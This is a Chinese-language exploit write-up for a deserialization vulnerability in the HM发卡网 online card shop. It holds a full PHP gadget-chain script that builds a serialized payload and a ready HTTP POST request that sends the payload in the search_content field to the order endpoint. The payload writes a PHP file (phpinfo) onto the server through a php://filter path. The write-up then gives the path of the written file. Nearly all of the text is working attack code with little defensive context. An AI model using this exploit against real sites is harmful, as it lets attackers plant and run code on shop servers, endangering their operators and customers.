## HM发卡网反序列化漏洞

源码下载地址：https://551f.lanzoub.com/iruk9wu9czi?w



## 反序列数据生成poc

```php
<?php
namespace think\process\pipes;
use think\model\Pivot;
class Pipes{
	
}
class Windows extends Pipes{
	private $files=[];
	function __construct(){
		$this->files=[new Pivot()];
	}
	
}
namespace think;
use think\model\relation\HasOne; // use 这里是函数名  用大写开头  写成了use think\model\relation\hasOne;
use think\console\Output;
abstract class Model{
	protected $append = [];
	protected $error;
	public $parent;       // 类型写错写错了 写成了 protected $parent; 
	public function __construct(){
		$this->append=["getError"];
		$this->error=new HasOne();
		$this->parent=new Output();
	}
}
namespace think\model\relation;
use think\model\Relation;
class HasOne extends OneToOne{
	function __construct(){
		parent::__construct();
	}
}
namespace think\model;
use think\db\Query;
abstract class Relation{
	protected $selfRelation;
	protected $query;
	function __construct(){
		$this->selfRelation=false;
		$this->query= new Query();
	}
}
namespace think\console;
use think\session\driver\Memcache;
class Output{
	private $handle = null;
	protected $styles = [];  //类型错了 写成了private $styles = [];
	function __construct(){
		$this->styles=['getAttr']; //这个条件忘记加了  注意上下文
		$this->handle=new Memcache();
	}
}
namespace think\db;
use think\console\Output;
class Query{
	protected $model;
	function __construct(){
		$this->model= new Output();
	}
}
namespace think\model\relation;
use think\model\Relation;
abstract class OneToOne extends Relation{
	
	protected $bindAttr = [];
	function __construct(){
		parent::__construct();
		$this->bindAttr=["kanjin","kanjin"];
		
	}
}
namespace think\session\driver;
use think\cache\driver\File;
class Memcache{
	protected $handler = null;
	function __construct(){
		$this->handler=new File();
	}
}
namespace think\cache\driver;
use think\cache\Driver;
class File extends Driver{
	protected $options=[];
	function __construct(){
		parent::__construct();
	$this->options = [
        'expire'        => 0,
        'cache_subdir'  => false,
        'prefix'        => '',
        'path'          => 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgcGhwaW5mbygpOz8+IA==/../a.php',
        'data_compress' => false,
    ];
	}
}
namespace think\cache;
abstract class Driver{
	 protected $tag;
	 function __construct(){
		 $this->tag=true;
	 }
}
namespace think\model;
use think\Model;
class Pivot extends Model{
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));

//
?>
```

![image-20240523221609630](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405232216691.png)

## 利用poc

```
POST /index.php/shop/order/orderContent?order_no=1 HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0

search_content=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTE6IgAqAGJpbmRBdHRyIjthOjI6e2k6MDtzOjY6ImthbmppbiI7aToxO3M6Njoia2FuamluIjt9czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjI5OiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZSI6MTp7czoxMDoiACoAaGFuZGxlciI7TzoyMzoidGhpbmtcY2FjaGVcZHJpdmVyXEZpbGUiOjI6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czoxMTA6InBocDovL2ZpbHRlci9jb252ZXJ0Lmljb252LnV0Zi04LnV0Zi03fGNvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT1hYWFQRDl3YUhBZ2NHaHdhVzVtYnlncE96OCtJQT09Ly4uL2EucGhwIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6NjoiACoAdGFnIjtiOjE7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19czo2OiJwYXJlbnQiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjI5OiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZSI6MTp7czoxMDoiACoAaGFuZGxlciI7TzoyMzoidGhpbmtcY2FjaGVcZHJpdmVyXEZpbGUiOjI6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czoxMTA6InBocDovL2ZpbHRlci9jb252ZXJ0Lmljb252LnV0Zi04LnV0Zi03fGNvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT1hYWFQRDl3YUhBZ2NHaHdhVzVtYnlncE96OCtJQT09Ly4uL2EucGhwIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6NjoiACoAdGFnIjtiOjE7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19fQ==
```

![image-20240523221918969](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405232219061.png)



![image-20240523221943077](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405232219142.png)



文件路径

```
http://127.0.0.1/a.php3b58a9545013e88c7186db11bb158c44.php
```

![image-20240523222022587](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405232220643.png)



